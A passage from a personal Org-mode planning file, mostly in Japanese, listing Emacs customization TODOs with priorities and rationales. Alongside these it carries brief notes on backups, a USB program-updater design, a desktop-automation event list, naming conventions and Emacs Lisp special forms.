   - reverse

4) 優先順位の根拠
   統計などの文字列を操作したい場合が多々ある

5) 備考

****** 7.3.9. [0/1]  Comments
******* POSTPONES [#B]  Header / Document 作成／ update

1) 結果
   change log の自動更新のみ未達

2) 背景 (問題点)
   find-file file を新規作成時に template を挿入
  + file name
    + Copyright
    + Commentary
    + change log
    + (defvar auto-document-version "$Id: auto-document.el,v 1.16 2010/05/04 09:00:52 rubikitch Exp $")
  - save-before-file file 名 などを update
    関数名 変数 の index を header に挿入

3) 対応方法
   header2.el

4) 優先順位の根拠
   library を作成／ update する時に有用

5) 備考

****** 7.3.10. [0/9] Alignment
******* TODO [#C] 文章を右揃え・中央揃えに整形する

1) 結果

2) 背景 (問題点)
   text 整形
3) 対応方法
   調査

4) 優先順位の根拠
   text mode ぐらいでしか使わない

5) 備考

******* TODO [#B] 空白文字で分割して整形。各フィールドは左揃え。

1) 結果

2) 背景 (問題点)
   text 整形

3) 対応方法
   align command

4) 優先順位の根拠
   プログラミングで利用

5) 備考
******* TODO [#B] 空白文字で分割して整形。各フィールドは右揃え。

1) 結果

2) 背景 (問題点)

3) 対応方法

4) 優先順位の根拠

5) 備考

******* TODO [#B] 空白文字で分割して整形。ダブルクォートで囲まれたフィールドをサポート。各フィールドは左揃え。

1) 結果

2) 背景 (問題点)
   text 整形

3) 対応方法
   align command

4) 優先順位の根拠
   プログラミングで利用

5) 備考

******* TODO [#B] 指定したセパレータで分割して整形。各フィールドは左揃え。

1) 結果

2) 背景 (問題点)
   text 整形

3) 対応方法
   align command

4) 優先順位の根拠
   プログラミングで利用

5) 備考

******* TODO [#B] 指定したセパレータで分割して整形。各フィールドは右揃え。

1) 結果

2) 背景 (問題点)
   text 整形

3) 対応方法
   align command

4) 優先順位の根拠
   プログラミングで利用

5) 備考

******* TODO [#B] 行末のバックスラッシュの位置の整形。シェルスクリプト用。

1) 結果

2) 背景 (問題点)
   text 整形

3) 対応方法
   align command

4) 優先順位の根拠
   プログラミングで利用

5) 備考

******* TODO [#B] 複数の変数を一度に宣言していたら、その宣言を 1 行ずつの変数宣言に変換する。

1) 結果

2) 背景 (問題点)
   text 整形

3) 対応方法
   align command

4) 優先順位の根拠
   プログラミングで利用

5) 備考

******* TODO [#B] 小数点の位置で数値を整形。

1) 結果

2) 背景 (問題点)
   text 整形

3) 対応方法
   align command

4) 優先順位の根拠
   プログラミングで利用

5) 備考

****** 7.3.11. [3/4] Insert template
******* DONE [#B] 日付挿入
        CLOSED: [2012-12-05 Wed 21:35]

1) 結果
   popup.el で導入
   timestamp-insert

2) 背景 (問題点)
   日付を挿入

3) 対応方法
   auto-complete などで挿入

4) 優先順位の根拠
   利用頻度は多い

5) 備考

******* DONE [#B] File name
        CLOSED: [2012-12-05 Wed 21:43]

1) 結果
   ac-source-filename

2) 背景 (問題点)
   file name を簡単に入力する。

3) 対応方法
   http://www.emacswiki.org/emacs/InsertFileName

4) 優先順位の根拠
   利用頻度は高い

5) 備考

******* DONE [#C] License
        CLOSED: [2012-12-26 Wed 08:12]

1) 結果

2) 背景 (問題点)
   comment に license を挿入

3) 対応方法
   autoinsert

4) 優先順位の根拠
   逼迫した需要はない

5) 備考

******* TODO [#C] ac-source kill-ring

1) 結果

2) 背景 (問題点)
   kill-ring を ac-sources にいれる

3) 対応方法
   ac-source candidate

4) 優先順位の根拠
   利用できると便利

5) 備考

****** TODO [#B] 上書きモード（ Ovwrt モード）

1) 結果

2) 背景 (問題点)
   上書きモードを paste 時などで利用

3) 対応方法
   調査

4) 優先順位の根拠
   緊急性はない

5) 備考

**** 9. History
***** 8.1. Running Time
****** DONE [#B] 起動、終了時刻を記録。
       CLOSED: [2012-12-03 Mon 14:48]

1) 結果

2) 背景 (問題点)
   起動、終了時刻を記録。
   統計に使えるようにする。

3) 対応方法

   [[#Emacs.log][Start & Exit log]]

4) 優先順位の根拠
   起動速度をあげるため必要

5) 備考

***** 8.2. Undo Redo
****** TODO [#B] undo redo を file ごとに disk に保存する。

1) 結果

2) 背景 (問題点)
   undo redo を file ごとに disk に保存する。

3) 対応方法
   undohist.el

4) 優先順位の根拠
   編集内容を損失しない為必要

5) 備考

****** DONE [#C] region 内のみ undo
       CLOSED: [2012-12-05 Wed 21:55]

1) 結果
   region and undo
   C-u C-z

2) 背景 (問題点)


3) 対応方法
   http://www.emacswiki.org/emacs/SelectiveUndo
   http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=undo

4) 優先順位の根拠
   利用頻度は低い
   逼迫した需要はない。

5) 備考

****** TODO [#B] save した時点を一句切とし bookmark の様に其の時点まで undo, redo する。


1) 結果

2) 背景 (問題点)

3) 対応方法
   undo point
   - http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=undo%20group

4) 優先順位の根拠
   有用である

5) 備考
****** TODO [#C] 編集履歴の見える化

1) 結果

2) 背景 (問題点)
   編集履歴を overlay する

3) 対応方法
   undo-tree

4) 優先順位の根拠
   あると便利だが逼迫した需要はない

5) 備考

***** 8.3. Kill-ring
***** 8.4. Command
****** TODO [#B] macro の環境を整る。

1) 結果

2) 背景 (問題点)
マクロの編集
マクロリング
マクロにキーを割り当てる

3) 対応方法


4) 優先順位の根拠
   利用頻度は高い

5) 備考

***** 8.5. Find-file
****** TODO [#B] file の open close save の log をとる

1) 結果

2) 背景 (問題点)
   file の open save close の log をとる


3) 対応方法

   [[#Emacs.log][Open Save Close log]]
   http://www.emacswiki.org/emacs/SaveLog
   http://www.emacswiki.org/emacs/Journal


4) 優先順位の根拠
   統計をとるため履歴参照のため必要

5) 備考

****** TODO [#B] file open の履歴をとる

1) 結果

2) 背景 (問題点)

3) 対応方法
   recentf

4) 優先順位の根拠
   重要

5) 備考

****** DONE [#B] recentf の調整
       CLOSED: [2012-12-05 Wed 22:31]

1) 結果
   recentf-auto-cleanup "11:00pm"

2) 背景 (問題点)
   保存間隔、 cleanup 間隔を調整する。

3) 対応方法

4) 優先順位の根拠
   起動速度にも関ってくるので重要

5) 備考

***** 8.6. Window
****** TODO [#C] window の undo 見える化

1) 結果

2) 背景 (問題点)
   window の undo を見える化
   線で図を表示できると良い
   artist mode で作成されたような線で書かれた window の
   配列を anything のようなインターフェースで選択し undo
   する。

3) 対応方法
   調査
   anything などで選択できるようにする。

4) 優先順位の根拠
   導入に時間が係りそうなのであとにする。


5) 備考

***** 8.10. Changelog
***** TODO [#A] ChangeLog の取扱環境を整る

1) 結果

2) 背景 (問題点)
- Subversion と連携
  Changelog に記載時に header, Changelog に記載。そして、
  commit log にも反映できるようにする。


3) 対応方法
   http://www.dodgson.org/omo/t/?date=20051013
   http://d.hatena.ne.jp/pyopyopyo/20070920/p1

4) 優先順位の根拠
   変更履歴を確認できるので早めに導入する。


5) 備考

**** 10. Display
***** 9.1. Frame
****** TODO [#B] Toggle bar

1) 結果

2) 背景 (問題点)
   menu-bar scroll-bar vertical-scroll-bar まとめて toggle
   まとめて off する関数
   まとめて on する関数

3) 対応方法
   関数作成

4) 優先順位の根拠
   導入が簡単

5) 備考


****** TODO [#C] 新しいフレームの作成

1) 結果

2) 背景 (問題点)
   新しいフレームをコマンドで作成

3) 対応方法


4) 優先順位の根拠
   緊急性はない

5) 備考

****** TODO [#B] Frame の表示位置をコマンドで切り換える

1) 結果

2) 背景 (問題点)
   frame の表示位置をコマンドで移動

3) 対応方法
   テンキーの配列を利用する。

4) 優先順位の根拠
   移動に便利

5) 備考

****** TODO [#A] Frame の最大化

1) 結果

2) 背景 (問題点)
   Frame の title を最大化時は nil にする。
   最大化時、 frame の縁をなくす

3) 対応方法
   windows http://www.emacswiki.org/emacs/FullScreen


4) 優先順位の根拠
   利用時にはほぼ必ず最大化して使うので

5) 備考

****** TODO [#C] 透過

1) 結果

2) 背景 (問題点)
   一時的に全ての文字を消す。
   透過モードでバックグラウンドの文字を見るため

3) 対応方法
   調査

4) 優先順位の根拠
   逼迫した需要はない

5) 備考

***** 9.2. Window
****** Split
******* TODO [#A] split window move

1) 結果

2) 背景 (問題点)
   移動先に window がなければ split して作成。
   素早く連続して入力した場合は縁を越て移動しない。

3) 対応方法
   関数を作成

4) 優先順位の根拠


5) 備考

******* TODO [#C] 分割禁止 window 設定

1) 結果

2) 背景 (問題点)
   分割したくない window を設定する。

3) 対応方法
   variable などを設定する。

4) 優先順位の根拠
   逼迫した需要なし

5) 備考

******* TODO [#B] 決った形に分割

1) 結果

2) 背景 (問題点)
   使用用途にあわせて window を分割

3) 対応方法
  + follow-mode
  + view-mode
  + coding-mode

4) 優先順位の根拠
   http://www.bookshelf.jp/soft/meadow_30.html#SEC414
   e2wm

5) 備考

****** TODO [#C] window の削除

1) 結果

2) 背景 (問題点)
   - 意図した window を削除。
     番号を選んで削除。
   - 現在の window を削除
   - 他の window を削除
   - 他の全ての window を削除

3) 対応方法
   調査が必要

4) 優先順位の根拠
   方法を探す

5) 備考

****** TODO [#C] Change window size

1) 結果

2) 背景 (問題点)
- 意図した大きさになるのが理想
- acejump のようにコマンド後に overlay で目標となる位置
  を表示して選ぶ。拡大／縮小する時に座標を表示する。
  中心などがわかりやすいようにする。
- interactive に拡大／縮小
- mouse で拡大／縮小
- 横幅を 80 にする。


3) 対応方法
   調査必要
4) 優先順位の根拠


5) 備考

****** TODO [#B] Translate window

1) 結果

2) 背景 (問題点)
   - 容易に意図した window のみを入替
   - 番号を選択して入替
   - interactive に入替
   - window buffer の入替

3) 対応方法
   http://www.emacswiki.org/emacs/ToggleWindowSplit


4) 優先順位の根拠
   利用頻度は多い

5) 備考

****** TODO [#C] Popup

1) 結果

2) 背景 (問題点)
   特定の window を popup で表示する。

3) 対応方法
   popwin

4) 優先順位の根拠
   e2wm でできるので

5) 備考
****** TODO [#B] Multi window

1) 結果

2) 背景 (問題点)
   multi cursor で編集
   複数の window で同時編集

3) 対応方法
   http://www.emacswiki.org/emacs/RecursiveEditPreservingWindowConfig

4) 優先順位の根拠
   multi cursor を導入してから

5) 備考

***** 9.3. Scrolling
****** TODO [#C] recenter

1) 結果

2) 背景 (問題点)
   cursor 位置を window の中央へ scroll

3) 対応方法
   keybind

4) 優先順位の根拠
   導入簡単 key の割当だけ

5) 備考

****** TODO [#C] cursor の位置を window の top へ scroll

1) 結果

2) 背景 (問題点)

3) 対応方法
   関数作成

4) 優先順位の根拠
   導入簡単

5) 備考

****** TODO [#C] 他の window を scroll

1) 結果

2) 背景 (問題点)
   他の window を scroll

3) 対応方法
   関数はあるが keybind の割当を見直す必要がある。

4) 優先順位の根拠
   導入簡単

5) 備考

****** TODO [#C] page 分割があれば page に合せる。

1) 結果

2) 背景 (問題点)
   cursol 移動時 page 分割があればそれにあわせて scroll する

3) 対応方法
   調査

4) 優先順位の根拠
   逼迫した需要なし

5) 備考

****** TODO [#C] page 番号を表示

1) 結果

2) 背景 (問題点)
   page 番号を表示する
   mode-line などにも表示できるように考慮

3) 対応方法
   調査

4) 優先順位の根拠
   逼迫した需要なし

5) 備考

****** TODO [#C] Horizontal scrolling

1) 結果

2) 背景 (問題点)
   横に scroll

3) 対応方法
   関数利用

4) 優先順位の根拠
   逼迫した需要なし

5) 備考

***** 9.4. Fringe
****** TODO [#C] 行の折り返し表示を変更する

1) 結果

2) 背景 (問題点)
   行の折り返し表示を見易くする

3) 対応方法

4) 優先順位の根拠
   逼迫した需要はない

5) 備考

***** 9.5. Mode-line
****** TODO [#B] default の mode-line 表示

1) 結果

2) 背景 (問題点)
| Current Line | Max Line | , | Column | Coding Style | Buffer name | Modify | Remote | minor mode |

3) 対応方法
   mode-line-format を編集

4) 優先順位の根拠
   mode-line で情報を確認できるようになると
   コマンドを打つ手間がなくなるので重要

5) 備考

****** TODO [#C] 状況に応じて mode-line の表示を変える。

1) 結果

2) 背景 (問題点)
   余り表示の必要のない buffer には表示を最小限にとどめる。

3) 対応方法
   http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=mode-line-hack

4) 優先順位の根拠
   逼迫した需要なし

5) 備考

****** TODO [#C] auto-save の状況を表示

1) 結果

2) 背景 (問題点)
   auto-save されていれば表示

3) 対応方法
   関数を書く

4) 優先順位の根拠
   逼迫した需要なし

5) 備考
****** TODO [#B] local vc の状況を表示

1) 結果

2) 背景 (問題点)
   local version control の作成状況を表示

3) 対応方法
   version control の関数から探す

4) 優先順位の根拠
   作成されているか気になることがあるので重要

5) 備考

****** TODO [#A] mode-line color

1) 結果

2) 背景 (問題点)
   反映されないことがあるので修正
   + view-mode なら赤系
   + 書込み可能なら緑系
   + 編集されたら文字の色を変える。


3) 対応方法
   view-mode

4) 優先順位の根拠
   視覚的に状況が解るので重要

5) 備考

****** TODO [#C] history 情報の表示を考える

1) 結果

2) 背景 (問題点)
  + undo redo
  + winner undo redo
  + point undo redo
  + last-command


3) 対応方法
   調査

4) 優先順位の根拠
   導入してみないと利便性がわからないものもあるので
   検討

5) 備考

****** TODO [#C] 文字数を count

1) 結果

2) 背景 (問題点)
   mode-line に buffer 全体の文字数を count する
   重くなる可能性

3) 対応方法
   http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=taiyaki%20wordcount

4) 優先順位の根拠
   逼迫した需要はない

5) 備考

****** TODO [#C] Minor mode の表示

1) 結果

2) 背景 (問題点)
   mode-line の表示領域が限られているので
   minor-mode の表示を縮める

3) 対応方法
   minor-mode-alist

4) 優先順位の根拠
   逼迫した需要なし

5) 備考

****** TODO [#C] notePC ならバッテリーの残量を表示

1) 結果

2) 背景 (問題点)
   notePC のバッテリー情報を表示

3) 対応方法
   notePC かどうかの確認

4) 優先順位の根拠
   現在逼迫した需要なし

5) 備考

****** TODO [#C] 時間の表示を考える

1) 結果

2) 背景 (問題点)
   時間を mode-line に表示する

3) 対応方法
   調査必要

4) 優先順位の根拠
   調査する

5) 備考

****** TODO [#C] ファイル名がかぶった場合にバッファ名をわかりやすくする。

1) 結果

2) 背景 (問題点)
   ファイル名がかぶった場合にバッファ名をわかりやすくする。

3) 対応方法
   uniquify

4) 優先順位の根拠
   導入済
   設定の見直し

5) 備考

****** TODO [#B] 編集すれば mode-line-buffer-id の色を変更。

1) 結果

2) 背景 (問題点)
   編集すれば mode-line-buffer-id の色を変更。

3) 対応方法
   mode-line-format を編集

4) 優先順位の根拠
   利便性が高い

5) 備考

****** TODO [#B] universal-argument を count する。

1) 結果

2) 背景 (問題点)
   universal-argument を count する。

3) 対応方法
   mode-line-format を編集

4) 優先順位の根拠
   利用してみないとわからないが
   おそらく利便性あり

5) 備考

***** 9.6. Cursor
****** TODO [#B] Change Cursor

1) 結果

2) 背景 (問題点)
   Change cursor 日本語

3) 対応方法
   http://www.emacswiki.org/emacs/ChangingCursorDynamically
   http://www.emacswiki.org/emacs/cursor-chg.el

4) 優先順位の根拠
   使用頻度、利便性が高い

5) 備考

***** 9.7. Font
****** TODO [#B] *Message* に使用 font を記載。

1) 結果

2) 背景 (問題点)
   Message から使用 font を調べることができる

3) 対応方法
   message 関数

4) 優先順位の根拠
   利便性もあり導入が容易

5) 備考
****** TODO [#B] Main Font と Sub Font を設定する。

1) 結果

2) 背景 (問題点)
   Font がない場合を考慮して予備を用意する

3) 対応方法
   fontlock

4) 優先順位の根拠
   利用頻度が多いので

5) 備考

****** TODO [#C] .emacs.d/ に ricty があるのでそこから読むようにする。

1) 結果

2) 背景 (問題点)
   他の環境で利用するとき

3) 対応方法
   file を指定する

4) 優先順位の根拠
   緊急性はなし

5) 備考

****** TODO [#C] ricty の i l 1 を見間違えないように改造する

1) 結果

2) 背景 (問題点)
   ricty の i l 1 は見間違えやすい

3) 対応方法
   i は そのまま
   l を 変更
   1 を 下線を引く

4) 優先順位の根拠
   変更はかなり困難が予想される

5) 備考

****** TODO [#C] フォントの横幅を調節する

1) 結果

2) 背景 (問題点)
   フォントの幅を調整

3) 対応方法

4) 優先順位の根拠
   逼迫した需要はない

5) 備考

****** TODO [#C] 文字サイズ 変更

1) 結果

2) 背景 (問題点)
   文字を大きくする
   文字を大きくする

3) 対応方法
   text-scale-increase text-scale-decrease

4) 優先順位の根拠
   緊急性はない

5) 備考

***** 9.8. Syntax Color
****** TODO [#C] フォントロックのフェイスで動作を変える

1) 結果

2) 背景 (問題点)

3) 対応方法
   http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=tmmofl

4) 優先順位の根拠
   逼迫した需要はない

5) 備考

**** 11. Help
****** TODO [#C] Documment ref

1) 結果

2) 背景 (問題点)

3) 対応方法
   langhelp http://jp.rubyist.net/magazine/?0017-langhelp
4) 優先順位の根拠

5) 備考

****** TODO [#B] Info tab 化

1) 結果

2) 背景 (問題点)
   info を tab 化して表示

3) 対応方法
   tabify

4) 優先順位の根拠
   利便性は高い

5) 備考

***** Algorithm
***** man ページの表示
***** コード表 表示
***** python document
***** Info
**** 12. Advanced Features
***** Maintenance mode
****** Compile
****** Package 管理
****** Keybind
****** 統計
****** Profile
***** Registers
***** Remote
***** Network
****** proxy
****** Web Browser
****** tramp
****** ftp
***** Shell
***** Printer
***** Scheduler
****** 時間管理ツール
****** カレンダの表示
****** ダイアリ機能
***** elisp で gui を自動操作。 auto hotkey のようなもの。
***** いろんなものを階層化して表示 ― ee
***** こそっとエディタ
***** 書き起こし
***** minimap
***** Hex 入力補助
***** subdir 一覧を得る

** Backup Server                                              :backup_server:
   [backup_server]
*** 容量
	- 無制限で利用できるところがよい。

*** location
	- 災害回避の為に国外が望ましい

** hacker
*** regular expression
*** electronics workship
**** TODO 電子工作の基礎を勉強
**** TODO 計画を立てる。
*** programming
**** 高級言語
***** C C++
**** 低級言語
***** assembly
**** 軽量言語
***** python
***** perl
***** shell script
** emergency_mode
*** Goal
	- 緊急時に完全削除。
	- 削除プログラムも削除。
	- クライアントは緊急削除用フォルダを作っておく。
	  そこにファイルを入れプログラムを発動する。
	- 各ソフトのキャッシュを削除

** Program
*** Python
**** update usb
***** Interface
****** CUI
0. Exit
1. All update
2. All update force
3. Select update

***** directory
update_usb/
  +--- __init__.py
  +--- update_usb.py
  +--- updater/
        +--- __init__.py
        +--- etc.py

***** process

[1] Confirm update require.
1.1. check using version.
1.2. check latest version.
1.3. if using program is up to date, do next

[2] Preparation
2.1. download latest version.
2.2. if file type is archive, then extract it.

[3] Do upgrade
3.1. if file type is installer, then use it.
3.2. if program is stand alone, then copy file.
3.3. if program has a lot of files, then copy direcory.

[4] Finalize
4.1. if file type is archive, then delete folder.


[5] Message
5.1
5.2 log

append [program, version, 'Aready up to date.']

# Common
1. check using version
3. confirm update require
4. if obsolete using version, download latest version

# differ

**** 国会議員 rss
***** 議員候補一覧 (候補含む)
****** source
- 党から抽出
- wiki

***** 現衆議院議員一覧
****** source
- 衆議院のページ
- wiki

***** 現参議院議員一覧
****** source
- 参議院のページ
- wiki

**** XAHK
***** Events
      *File Event*
      + File Created Event
      + File Deleted Event
      + File Modified Event
      + File Moved Event
      + File Open Event
      + Directory Created Event
      + Directory Deleted Event
      + Directory Modified Event
      + Directory Moved Event
      *Window Event*
      + Key Event
      + Mouse Event
      + Joystick Event
      + Window Created Event
      + Window Destroy Event
      + Window Maximized Event
      + Window Minimized Event
      + Window Hide
      + Drop to Window Event       
      + Window Activate Event
      + Window Deactivate Event
      + Window FocusIn, FocusOut Event    
      + Window Show Event
      + Window Move Event
      + Window Reize Event
      + Window Child Added Event
      + Window Child Remove Event
      + Window ParentChange Event
      + Window Close Event
      + Window Title Change Event
      + Window Fullscreen Event
      + Window Shaded Event
      + Window StateChanged Event
      + Window PID Changed Event
      + Cursor Change Event
      + Cursor Event: changed under window
      + Cursor Enter, Leave Event
      + Drag Enter, Leave, Move Event
      + Enter Edit Focus Event
      + Gesture Event
      + KeyboardMapChanged Event
      + Clipboard Event
      + Touch Begin Event
      + Touch Cancel Event
      + Touch End Event
      + Touch Update Event
      + Workspace Change
      + Window Workspece Change
      *System Event*
      + Shutdown Event
      + Buttery Event
      + Power Event
      + HotPlug Event
      + Environ Event 環境変数
      + DVD/CD Drive Event
      *Schedule Event*
      + Timer Event
      + Idle Timer Event
      *Network Event*
      + Other Local Host Add Event
      + Adapter Added


* Develop
** Common Develop
*** Lab
*** project 管理
*** Policy
**** 変数
**** 関数
**** 条件文
*** Default Coding Style
**** Naming Conventions
|-------------------------+----------------------------------------------------------------------------|
| Entity                  | Description                                                                |
|-------------------------+----------------------------------------------------------------------------|
| ClassName               | Class names are in mixed upper and lower case with an                      |
|                         | initial capital letter.                                                    |
|-------------------------+----------------------------------------------------------------------------|
| TypeName                | Type definitions including enumerated types and                            |
|                         | typedefs use mixed upper and lower case with an initial                    |
|                         | capital letter                                                             |
|-------------------------+----------------------------------------------------------------------------|
| EnumeratedTypes         | In addition to the rule above, enumerated types are                        |
|                         | always stated in the plural form.                                          |
|-------------------------+----------------------------------------------------------------------------|
| localVariable           | Local variables are in mixed uppercase and lowercase                       |
|                         | with an initial lower case letter. The name should be                      |
|                         | independent of the underlying data type and should                         |
|                         | refer to whatever the variable represents.                                 |
|-------------------------+----------------------------------------------------------------------------|
| RoutineName ()          | Routines are in mixed uppercase and lowercase.                             |
|-------------------------+----------------------------------------------------------------------------|
| m_ClassVariable         | Member variables that are available to multiple routines                   |
|                         | within a class, but only within a class, are prefixed with                 |
|                         | an m_.                                                                     |
|-------------------------+----------------------------------------------------------------------------|
| g_GlobalVariable        | Global variables are prefixed with a g_.                                   |
|-------------------------+----------------------------------------------------------------------------|
| CONSTANT                | Named constants are in ALL_CAPS.                                           |
|-------------------------+----------------------------------------------------------------------------|
| MACRO                   | Macros are in ALL_CAPS.                                                    |
|-------------------------+----------------------------------------------------------------------------|
| Base_EnumeratedType     | Enumerated types are prefixed with a mnemonic for                          |
|                         | their base type stated in the singular?for example,                        |
|                         | Color_Red, Color_Blue.                                                     |
|-------------------------+----------------------------------------------------------------------------|
| TypeName                | Type definitions use mixed upper and lower case with                       |
|                         | an initial capital letter                                                  |
|-------------------------+----------------------------------------------------------------------------|
| GlobalRoutineName ()    | Public routines are in mixed uppercase and lowercase.                      |
|-------------------------+----------------------------------------------------------------------------|
| f_FileRoutineName ()    | Routines that are private to a single module (file) are                    |
|                         | prefixed with an f-underscore.                                             |
|-------------------------+----------------------------------------------------------------------------|
| LocalVariable           | Local variables are in mixed uppercase and lowercase.                      |
|                         | The name should be independent of the underlying data                      |
|                         | type and should refer to whatever the variable                             |
|                         | represents.                                                                |
|-------------------------+----------------------------------------------------------------------------|
| f_FileStaticVariable    | Module (file) variables are prefixed with an f-underscore.                 |
|-------------------------+----------------------------------------------------------------------------|
| G_GLOBAL_GlobalVariable | Global variables are prefixed with a G_ and a                              |
|                         | mnemonic of the module (file) that defines the variable                    |
|                         | in all uppercase?for example, SCREEN_Dimensions.                           |
|-------------------------+----------------------------------------------------------------------------|
| LOCAL_CONSTANT          | Named constants that are private to a single routine or                    |
|                         | module (file) are in all uppercase?for example,                            |
|                         | ROWS_MAX.                                                                  |
|-------------------------+----------------------------------------------------------------------------|
| G_GLOBALCONSTANT        | Global named constants are in all uppercase and are                        |
|                         | prefixed with G_ and a mnemonic of the module (file)                       |
|                         | that defines the named constant in all uppercase?for                       |
|                         | example, G_SCREEN_ROWS_MAX.                                                |
|-------------------------+----------------------------------------------------------------------------|
| LOCALMACRO ()           | Macro definitions that are private to a single routine or                  |
|                         | module (file) are in all uppercase.                                        |
|-------------------------+----------------------------------------------------------------------------|
| G_GLOBAL_MACRO ()       | Global macro definitions are in all uppercase and are                      |
|                         | prefixed with G_ and a mnemonic of the module (file)                       |
|                         | that defines the macro in all uppercase?for example, G_SCREEN_LOCATION (). |
|-------------------------+----------------------------------------------------------------------------|

**** Prefixes
|----------+--------------------------------------------------------------------------------|
| Semantic | meanig                                                                         |
|----------+--------------------------------------------------------------------------------|
| c        | Count (as in the number of records, characters, and so on)                     |
|----------+--------------------------------------------------------------------------------|
| first    | The first element that needs to be dealt with in an array. first is similar to |
|----------+--------------------------------------------------------------------------------|
| min      | but relative to the current operation rather than to the array itself.         |
|----------+--------------------------------------------------------------------------------|
| g        | Global variable                                                                |
|----------+--------------------------------------------------------------------------------|
| i        | Index into an array                                                            |
|----------+--------------------------------------------------------------------------------|
| last     | The last element that needs to be dealt with in an array. last is the          |
|          | counterpart of first.                                                          |
|----------+--------------------------------------------------------------------------------|
| lim      | The upper limit of elements that need to be dealt with in an array. lim is     |
|          | not a valid index. Like last, lim is used as a counterpart of first. Unlike    |
|          | last, lim represents a noninclusive upper bound on the array; last             |
|          | represents a final, legal element. Generally, lim equals last + 1.             |
|----------+--------------------------------------------------------------------------------|
| m        | Class-level variable                                                           |
|----------+--------------------------------------------------------------------------------|
| max      | The absolute last element in an array or other kind of list. max refers to     |
|          | the array itself rather than to operations on the array.                       |
|----------+--------------------------------------------------------------------------------|
| min      | The absolute first element in an array or other kind of list.                  |
|----------+--------------------------------------------------------------------------------|
| p        | Pointer                                                                        |
|----------+--------------------------------------------------------------------------------|



**** タブ幅
**** タブをスペースに変更
**** パラグラフのインデント
*** Change Log
*** Tags
*** Documentation Lookup
*** Comments
*** Completion
*** Window
*** Cycle
**** Design
**** Code Reading
- ref. http://i.loveruby.net/ja/misc/readingcode.html

***** Over view
- Make preprocessor, callgraph and name list while Specification
****** Build & Run
:実行して確認 変更させて動作させる:

- 関数すべてに"in <関数名>"の debug print を挿入
  関数がよばれるたびにカウントし print する。
  表示は file 名,関数名を表示。
  log を取る。

- 変数の変更があれば表示
****** Specification
******* Constraction
- Directory Constraction
- File Constraction
****** History
- Changelog
- Readme
- mailing list
- news
- subversion
****** Preprocessor
****** minimap
******* TODO follow mode
******* TODO left view and imenu
******* TODO Microsoft Word
******* TODO Libre Office Writer
****** Callgraph
- doxygen
****** symbol list
- functions
- variables
- classes
******* Expand abbreviation
***** Commenting on source
***** Jump Function or Variable
***** Document
****** TODO [0/2] 簡易表示
******* TODO arguments
******* TODO Summary

****** TODO [0/2] 詳細表示
******* TODO info
******* TODO source

****** TODO [0/2] Document History
******* TODO visited count
******* TODO memo

**** Edit Source
***** Pseudocode
- コメントで疑似コードを下書きする。
***** Code navigation
***** Template
***** refactoring
***** Interpreter
**** Compile build (error check)
**** Profile
**** Run
**** Test
**** Debug
***** コンパイルエラー
***** ランタイムエラー
***** 論理エラー
**** SubVersion
** Programming Languages
*** C C++
**** Coding Style
**** stl
***** array
#include <array>
#include <algorithm>
#include <functional>
#include <numeric>
#include "print.cc"
using namespace std;

int main (int argc, char **argv)
{
  array<int, 10> a = {11, 22, 33, 44};
  PRINT_ELEMENTS (a);
  a.back () = 9999999;
  a[a.size ()-2] = 42;
  PRINT_ELEMENTS (a);
  return 0;
}


*** Emacs Lisp
**** Coding Style
**** Interpreter
***** scratch
**** tmp
***** special form
****** with-current-buffer
       1.	そのバッファを一時的にカレントバッファにする
****** save-excursion
       save-excurtion に入った時点のポイント位置、マーク位置、
       カレントバッファを記憶し、引数中の処理を行った後にそれらを復帰する。
****** save-match-data
       match-data の内容を保存して引数内を評価した後で、 match-data の内容を復帰する。
****** unwind-protect
       unwind-protect は, body からどのように制御が離れた場合にも cleanup-forms の実行を保証して, body を実行
       する. body は通常どおり完了するか, throw を実行して unwind-protect から脱出するか, エラーを引き起こす.
       いずれの場合でも, cleanup-forms は評価される.
****** save-selected-window
       一時的にウィンドウを選択し、その後で元のウィンドウに戻す
****** condition-case
       この特殊フォームは、エラーが出さ (訳注： signal) れた場合、 (処理の全体をアボートするのではなく) Lisp プ
       ログラムが、そのエラーを扱うことができるようにします。 condition-case フォームは評価されると、まず
       (signal が探す) 特殊なマーカーをスタック上に置きます。次に、 form を評価します。 form がエラーを生ずる
       ことなく評価された場合、その結果を condition-case の値とします。

       form の評価中にエラーが出さ (訳注： signal) れた場合、 signal は condition- case マークを見つけるまでスタ
       ックをサーチし、 (現われた順に) そ handlers を見ていきます。各ハンドラは、 (condition-name body*) とい
       った形をしています。

       あるハンドラ中の condition-name が、そのエラーシンボルに対応付けられたコンディションの 1 つである場合、
       そのハンドラを用います。 (最初に) 変数 var に、 (それを持って signal が呼ばれた) リスト data と
       (condition-name ではなく) エラーシンボルとをコンスしたリストをバインドします。 (次に) body フォームを評
       価し、その最後の値を結果とします。

       condition-case が、 (その) どのコンディションに対するハンドラも持たない場合、 signal はそのエラーを扱う
       (別の) condition-case がスタック上に存在しないか調べ (続け) ます。見つからなかった場合、処理 (訳注：
       computation) をアボートします。

****** save-restriction
       ナロイング範囲を変更した場合にはもとに戻す
****** save-window-excursion
       the window configuration
****** with-temp-buffer
****** save-window-excursion
	 この関数は, buffer-name という名前のバッファに forms の任意の出力が挿入されるように準備して forms を
	 実行する. そのバッファは適当なウィンドウに表示されるが, そのバッファは選択されない.

	 文字列 buffer-name は, 既存である必要はない一時的なバッファを指定する. 引数は, バッファではなく文字
	 列であること. （問い合わせずに）はじめにバッファを消去し, with-output-to-temp-buffer が終了すると
	 未変更と印を付ける.

	 with-output-to-temp-buffer は, standard-output に一時的なバッファを束縛し, forms のフォーム群を評価
	 する. forms 内で用いた Lisp 出力関数からの出力はデフォルトでそのバッファに入る（しかし, スクリーン表
	 示やエコー領域のメッセージは, 用語の一般的な意味で『出力』であるが, 影響されない. ） see section
	 出力関数.

	 forms の最後のフォームの値を返す.

	 ---------- Buffer: foo ----------
	 This is the contents of foo.
	 ---------- Buffer: foo ----------

	 (with-output-to-temp-buffer "foo"
	 (print 20)
	 (print standard-output))
	 ⇑ #<buffer foo>

	 ---------- Buffer: foo ----------
	 20

#<buffer foo>

	 ---------- Buffer: foo ----------

****** with-output-to-temp-buffer
****** ignore-errors
***** cua-set
      C-x r c	clear-rectangle	矩形領域を空白文字に置き換える
      C-x r d	delete-rectangle	矩形領域を削除する
      C-x r o	open-rectangle	空白文字で埋まった矩形領域を挿入する
